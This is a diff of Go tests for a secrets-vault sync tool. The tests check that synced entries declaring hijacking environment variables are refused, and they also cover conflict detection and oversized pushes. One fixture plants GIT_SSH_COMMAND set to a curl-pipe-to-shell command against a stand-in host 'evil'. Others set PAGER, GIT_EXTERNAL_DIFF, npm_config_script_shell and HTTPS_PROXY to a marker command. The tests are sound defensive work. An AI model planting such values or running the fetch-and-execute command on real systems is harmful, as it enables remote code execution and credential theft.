@@ -378,10 +378,10 @@ func TestCopyMissingASecretIsRefused(t *testing.T) {
 	}
 }
 
-// A copied entry may not declare a variable that makes programs load code: a
-// box could otherwise turn a credential into code run by the next exec here,
-// and this machine could do the same to a box.
-func TestCopiesRefuseCodeLoadingVariables(t *testing.T) {
+// A copied entry may not declare a variable that runs code or redirects
+// traffic: a box could otherwise turn a credential into code run by the next
+// exec here, and this machine could do the same to a box.
+func TestCopiesRefuseHijackingVariables(t *testing.T) {
 	planted := vault.Entry{Name: "stripe", Vars: []vault.Var{
 		{Name: "STRIPE_KEY", Secret: true},
 		{Name: "GIT_SSH_COMMAND", Value: "sh -c 'curl evil | sh'"},
@@ -396,6 +396,16 @@ func TestCopiesRefuseCodeLoadingVariables(t *testing.T) {
 	}
 	if _, ok := local.Get("stripe"); ok {
 		t.Error("an entry declaring GIT_SSH_COMMAND was stored")
+	}
+
+	// Commands run straight from a value, lowercase names, traffic redirected.
+	for _, variable := range []string{"GIT_EXTERNAL_DIFF", "PAGER", "npm_config_script_shell", "HTTPS_PROXY"} {
+		session := liar(t, response{Entries: []Credential{{Entry: vault.Entry{
+			Name: "gadget", Vars: []vault.Var{{Name: variable, Value: "touch /tmp/pwned"}},
+		}}}})
+		if pulled, err := session.Pull(local, []string{"gadget"}, false); err != nil || pulled[0].Outcome != Failed {
+			t.Errorf("a copy declaring %s = %+v, %v; want a failure", variable, pulled, err)
+		}
 	}
 
 	sender, box := newVault(t), newVault(t)
@@ -462,6 +472,69 @@ func TestBoxAuditsEveryReceivedEntry(t *testing.T) {
 	defer log.mu.Unlock()
 	if len(log.events) != 1 || log.events[0].Entry != "cdp-es" || log.events[0].Outcome != Conflict {
 		t.Errorf("box audit = %+v, want the refused push", log.events)
+	}
+}
+
+// reopen is a second handle on v's directory, as another process would have:
+// the picker's vault and sync-serve's stay open while others change them.
+func reopen(t *testing.T, v *vault.Vault) *vault.Vault {
+	t.Helper()
+	t.Setenv("BLINDFOLD_KEK_FILE", filepath.Join(filepath.Dir(v.Dir()), "kek"))
+	other, err := vault.Open(v.Dir())
+	if err != nil {
+		t.Fatal(err)
+	}
+	return other
+}
+
+// A session held open sees what other processes changed since, on both
+// sides: an entry added meanwhile is a conflict, not silently replaced, and
+// one edited meanwhile still compares.
+func TestSessionSeesChangesMadeMeanwhile(t *testing.T) {
+	single := func(name string) vault.Entry {
+		return vault.Entry{Name: name, Vars: []vault.Var{{Name: "KEY", Secret: true}}}
+	}
+	local, box := newVault(t), newVault(t)
+	put(t, local, single("EDITED"), map[string]string{"KEY": "same"})
+	put(t, box, single("EDITED"), map[string]string{"KEY": "same"})
+	session := connectToBox(t, box)
+	put(t, local, single("PUSHED"), map[string]string{"KEY": "here"})
+	put(t, box, single("PULLED"), map[string]string{"KEY": "box"})
+
+	put(t, reopen(t, box), single("PUSHED"), map[string]string{"KEY": "added on the box meanwhile"})
+	edited := single("EDITED")
+	edited.Description = "edited on the box meanwhile"
+	put(t, reopen(t, box), edited, nil)
+	put(t, reopen(t, local), single("PULLED"), map[string]string{"KEY": "added here meanwhile"})
+
+	if states, err := session.Status(local); err != nil || states["EDITED"] != Differs {
+		t.Errorf("status = %v, %v; want EDITED to differ", states, err)
+	}
+	if pushed, err := session.Push(local, []string{"PUSHED"}, false); err != nil || pushed[0].Outcome != Conflict {
+		t.Errorf("push = %+v, %v; want a conflict", pushed, err)
+	}
+	if pulled, err := session.Pull(local, []string{"PULLED"}, false); err != nil || pulled[0].Outcome != Conflict {
+		t.Errorf("pull = %+v, %v; want a conflict", pulled, err)
+	}
+	if got, _ := reopen(t, local).UnsealVar("PULLED", "KEY"); got != "added here meanwhile" {
+		t.Errorf("PULLED here was replaced with %q", got)
+	}
+}
+
+// A push too large for one frame is refused before anything is sent, and the
+// session goes on.
+func TestOversizedPushIsNotSent(t *testing.T) {
+	local, box := newVault(t), newVault(t)
+	put(t, local, vault.Entry{Name: "huge", Vars: []vault.Var{{Name: "BLOB", Secret: true}}},
+		map[string]string{"BLOB": strings.Repeat("x", maxFrameSize)})
+	session := connectToBox(t, box)
+
+	var notSent *NotSentError
+	if _, err := session.Push(local, []string{"huge"}, false); !errors.As(err, &notSent) {
+		t.Errorf("push = %v, want it refused before sending", err)
+	}
+	if _, err := session.Status(local); err != nil {
+		t.Errorf("the session ended: %v", err)
 	}
 }
 
